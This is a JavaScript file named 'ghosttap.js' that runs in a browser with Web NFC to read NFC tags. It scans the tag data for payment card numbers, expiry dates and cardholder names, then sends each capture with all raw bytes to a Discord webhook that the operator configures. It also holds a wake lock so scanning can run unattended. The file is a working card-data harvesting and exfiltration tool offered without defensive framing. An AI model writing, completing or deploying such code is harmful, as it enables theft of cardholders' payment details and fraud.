// ghosttap.js – FULL NFC READER DEC 2025
const DISCORD_WEBHOOK = ""; // PLACE YOUR DISCORD WEBHOOK HERE BETWEEN THE " "

let cardCount = 0;
let ndef = null;
let abortController = null;

// ==================== LOGGING ====================
function log(txt, color = "#0f0") {
  const l = document.getElementById("log");
  if (l) {
    l.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${txt}</div>`;
    l.scrollTop = l.scrollHeight;
  }
  console.log(txt);
}

function updateStatus(txt) {
  const s = document.getElementById("status");
  if (s) s.textContent = txt;
}

// ==================== DATA SENDING ====================
async function send(data) {
  if (!DISCORD_WEBHOOK) {
    log("⚠ No webhook configured – data logged locally only", "#ff0");
    console.log("NFC DATA:", data);
    return;
  }
  try {
    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`` })
    });
    log("✓ Data sent to webhook", "#0f0");
  } catch (e) {
    log(`✗ Webhook error: ${e.message}`, "#f00");
  }
}

// ==================== UTILITY FUNCTIONS ====================
// Convert bytes to hex string
function bytesToHex(bytes) {
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0').toUpperCase()).join(' ');
}

// Convert bytes to ASCII (printable chars only)
function bytesToAscii(bytes) {
  return Array.from(bytes).map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.').join('');
}

// Try to find card number patterns in various formats
function extractPAN(data) {
  // Try text decoding
  try {
    const text = new TextDecoder('utf-8', { fatal: false }).decode(new Uint8Array(data));
    // Standard card number (13-19 digits)
    const match = text.match(/[0-9]{13,19}/);
    if (match) return match[0];
  } catch (e) { }

  // Try BCD encoding (each nibble is a digit)
  try {
    const bytes = new Uint8Array(data);
    let bcd = '';
    for (let b of bytes) {
      bcd += ((b >> 4) & 0x0F).toString();
      bcd += (b & 0x0F).toString();
    }
    const match = bcd.match(/[0-9]{13,19}/);
    if (match) return match[0];
  } catch (e) { }

  return null;
}

// Extract expiry date in various formats
function extractExpiry(data) {
  try {
    const text = new TextDecoder('utf-8', { fatal: false }).decode(new Uint8Array(data));
    // MM/YY or YYMM or MMYY patterns
    const patterns = [
      /(\d{2})\/(\d{2})/,           // MM/YY
      /(\d{2})-(\d{2})/,            // MM-YY
      /(\d{4})\/(\d{2})/,           // YYYY/MM
      /EXP[:\s]*(\d{2})(\d{2})/i,   // EXP:MMYY
      /(\d{2})(\d{2})(?=\s|$)/      // MMYY at end
    ];
    for (const p of patterns) {
      const m = text.match(p);
      if (m) return `${m[1]}/${m[2]}`;
    }
  } catch (e) { }
  return null;
}

// Extract cardholder name
function extractName(data) {
  try {
    const text = new TextDecoder('utf-8', { fatal: false }).decode(new Uint8Array(data));
    // Name is usually all caps, 2-26 chars
    const match = text.match(/[A-Z][A-Z\s\.]{2,25}[A-Z]/);
    if (match) return match[0].trim();
  } catch (e) { }
  return null;
}

// ==================== RECORD DECODER ====================
function decodeRecord(record) {
  const result = {
    recordType: record.recordType || "unknown",
    mediaType: record.mediaType || null,
    id: record.id || null,
    encoding: record.encoding || null,
    lang: record.lang || null,
    data: null,
    text: null,
    hex: null,
    ascii: null,
    byteLength: 0
  };

  try {
    if (!record.data || record.data.byteLength === 0) {
      result.text = "(empty)";
      return result;
    }

    const bytes = new Uint8Array(record.data);
    result.byteLength = bytes.length;
    result.data = Array.from(bytes);
    result.hex = bytesToHex(bytes);
    result.ascii = bytesToAscii(bytes);

    // Decode based on record type
    switch (record.recordType) {
      case "text":
        // NDEF Text records: first byte = status (UTF-8/16 flag + lang length)
        const status = bytes[0];
        const langLength = status & 0x3F;
        const isUTF16 = (status & 0x80) !== 0;
        const textBytes = bytes.slice(1 + langLength);
        const decoder = new TextDecoder(isUTF16 ? 'utf-16be' : 'utf-8');
        result.text = decoder.decode(textBytes);
        result.lang = new TextDecoder().decode(bytes.slice(1, 1 + langLength));
        break;

      case "url":
      case "U":
        // URL records may have a prefix code
        const prefixes = ["", "http://www.", "https://www.", "http://", "https://", "tel:", "mailto:", "ftp://anonymous:anonymous@", "ftp://ftp.", "ftps://", "sftp://", "smb://", "nfs://", "ftp://", "dav://", "news:", "telnet://", "imap:", "rtsp://", "urn:", "pop:", "sip:", "sips:", "tftp:", "btspp://", "btl2cap://", "btgoep://", "tcpobex://", "irdaobex://", "file://", "urn:epc:id:", "urn:epc:tag:", "urn:epc:pat:", "urn:epc:raw:", "urn:epc:", "urn:nfc:"];
        const prefixCode = bytes[0];
        const urlBytes = bytes.slice(1);
        const prefix = prefixes[prefixCode] || "";
        result.text = prefix + new TextDecoder().decode(urlBytes);
        break;

      case "mime":
      case "M":
        result.text = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
        break;

      case "smart-poster":
      case "Sp":
        result.text = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
        break;

      case "external":
      case "android.com:pkg":
        result.text = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
        break;

      default:
        // Try to decode as UTF-8 text
        result.text = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
        break;
    }
  } catch (e) {
    result.error = e.message;
  }

  return result;
}

// ==================== MAIN NFC SCAN ====================
async function startScan() {
  // Check HTTPS requirement
  if (location.protocol !== "https:" && location.hostname !== "localhost" && location.hostname !== "127.0.0.1") {
    log("✗ Web NFC requires HTTPS!", "#f00");
    updateStatus("Error: HTTPS required");
    return;
  }

  // Check browser support
  if (!("NDEFReader" in window)) {
    log("✗ Web NFC not supported", "#f00");
    log("ℹ Requires Android + Chrome 89+", "#ff0");
    updateStatus("NFC not supported");
    return;
  }

  // Check permission
  try {
    const perm = await navigator.permissions.query({ name: "nfc" });
    log(`ℹ NFC permission: ${perm.state}`, "#0ff");
    if (perm.state === "denied") {
      log("✗ NFC permission denied", "#f00");
      updateStatus("NFC denied");
      return;
    }
  } catch (e) {
    log("ℹ Permission check skipped", "#ff0");
  }

  // Create abort controller
  abortController = new AbortController();

  try {
    ndef = new NDEFReader();

    // ===== READING EVENT =====
    ndef.addEventListener("reading", ({ message, serialNumber }) => {
      cardCount++;
      const timestamp = new Date().toISOString();

      log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, "#888");
      log(`📡 TAG #${cardCount} DETECTED`, "#0f0");
      log(`Serial: ${serialNumber || "N/A"}`, "#0ff");
      log(`Records: ${message.records.length}`, "#0ff");
      updateStatus(`Reading tag #${cardCount}...`);

      // Process all records
      const records = [];
      let extractedPAN = null;
      let extractedExp = null;
      let extractedName = null;
      let allRawBytes = [];

      for (let i = 0; i < message.records.length; i++) {
        const record = message.records[i];
        const decoded = decodeRecord(record);
        records.push(decoded);

        log(`Record ${i + 1}: [${decoded.recordType}]`, "#ff0");
        if (decoded.text) {
          log(`  Text: ${decoded.text.substring(0, 80)}${decoded.text.length > 80 ? '...' : ''}`, "#fff");
        }
        if (decoded.hex) {
          log(`  Hex: ${decoded.hex.substring(0, 60)}${decoded.hex.length > 60 ? '...' : ''}`, "#888");
        }

        // Try to extract card data from this record
        if (decoded.data) {
          allRawBytes.push(...decoded.data);

          if (!extractedPAN) extractedPAN = extractPAN(decoded.data);
          if (!extractedExp) extractedExp = extractExpiry(decoded.data);
          if (!extractedName) extractedName = extractName(decoded.data);
        }
      }

      // Also try to extract from combined data
      if (!extractedPAN && allRawBytes.length > 0) {
        extractedPAN = extractPAN(allRawBytes);
      }
      if (!extractedExp && allRawBytes.length > 0) {
        extractedExp = extractExpiry(allRawBytes);
      }
      if (!extractedName && allRawBytes.length > 0) {
        extractedName = extractName(allRawBytes);
      }

      // Build complete data object
      const tagData = {
        _type: "NFC_TAG_READ",
        _timestamp: timestamp,
        _tagNumber: cardCount,
        serialNumber: serialNumber || "unknown",
        recordCount: message.records.length,

        // Extracted data
        extracted: {
          pan: extractedPAN || "not found",
          expiry: extractedExp || "not found",
          name: extractedName || "not found"
        },

        // All records with full data
        records: records,

        // Combined raw data
        rawHex: bytesToHex(allRawBytes),
        rawBytes: allRawBytes
      };

      // Log summary
      if (extractedPAN) {
        log(`💳 PAN: ${extractedPAN.replace(/(.{4})/g, '$1 ').trim()}`, "#0f0");
      }
      if (extractedExp) {
        log(`📅 EXP: ${extractedExp}`, "#0f0");
      }
      if (extractedName) {
        log(`👤 NAME: ${extractedName}`, "#0f0");
      }
      log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, "#888");

      // Send to webhook
      send(tagData);
      updateStatus(`✓ ${cardCount} tag(s) captured`);
    });

    // ===== ERROR EVENT =====
    ndef.addEventListener("readingerror", (event) => {
      log(`✗ Read error: ${event.message || "Failed to read tag"}`, "#f00");
      updateStatus("Read error - try again");
    });

    // ===== START SCANNING =====
    log("▶ Starting NFC scan...", "#ff0");
    await ndef.scan({ signal: abortController.signal });
    log("✓ NFC ACTIVE - Hold near tag", "#0f0");
    updateStatus("NFC Ready - hold near tag");

  } catch (error) {
    log(`✗ ${error.name}: ${error.message}`, "#f00");

    if (error.name === "NotAllowedError") {
      log("ℹ Tap button again to allow NFC", "#ff0");
      updateStatus("Tap to allow NFC");
    } else if (error.name === "NotSupportedError") {
      log("ℹ NFC hardware not available", "#ff0");
      updateStatus("No NFC hardware");
    } else {
      updateStatus("NFC Error");
    }
  }
}

function stopScan() {
  if (abortController) {
    abortController.abort();
    abortController = null;
    ndef = null;
    log("⬛ Scan stopped", "#ff0");
    updateStatus("Scan stopped");
  }
}

// ==================== UI SETUP ====================
document.addEventListener("DOMContentLoaded", () => {
  const container = document.createElement("div");
  container.style.cssText = "position:fixed;top:10px;left:10px;z-index:999;display:flex;gap:10px;";

  const startBtn = document.createElement("button");
  startBtn.textContent = "▶ START NFC";
  startBtn.id = "startBtn";
  startBtn.style.cssText = "background:linear-gradient(135deg,#00c853,#00a843);color:white;padding:14px 24px;border:none;border-radius:10px;cursor:pointer;font-weight:bold;font-size:15px;box-shadow:0 4px 20px rgba(0,200,83,0.5);";

  const stopBtn = document.createElement("button");
  stopBtn.textContent = "⬛ STOP";
  stopBtn.id = "stopBtn";
  stopBtn.disabled = true;
  stopBtn.style.cssText = "background:linear-gradient(135deg,#f44336,#c62828);color:white;padding:14px 24px;border:none;border-radius:10px;cursor:pointer;font-weight:bold;font-size:15px;box-shadow:0 4px 20px rgba(244,67,54,0.5);opacity:0.5;";

  startBtn.onclick = () => {
    startScan();
    startBtn.disabled = true;
    startBtn.style.opacity = "0.5";
    stopBtn.disabled = false;
    stopBtn.style.opacity = "1";
  };

  stopBtn.onclick = () => {
    stopScan();
    startBtn.disabled = false;
    startBtn.style.opacity = "1";
    stopBtn.disabled = true;
    stopBtn.style.opacity = "0.5";
  };

  container.appendChild(startBtn);
  container.appendChild(stopBtn);
  document.body.appendChild(container);

  log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "#888");
  log("📱 GHOSTTAP NFC READER", "#0f0");
  log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "#888");
  log("ℹ Tap START NFC to begin", "#ff0");
  log("ℹ Requires: Android + Chrome 89+", "#0ff");
  log("ℹ NFC must be enabled on device", "#0ff");
});

// ==================== KEEP SCREEN AWAKE ====================
let wakeLock = null;

async function requestWakeLock() {
  try {
    if ("wakeLock" in navigator) {
      wakeLock = await navigator.wakeLock.request("screen");
      wakeLock.addEventListener("release", () => {
        log("ℹ Screen wake lock released", "#888");
      });
    }
  } catch (e) {
    // Wake lock not available or denied
  }
}

document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    requestWakeLock();
  }
});

requestWakeLock();
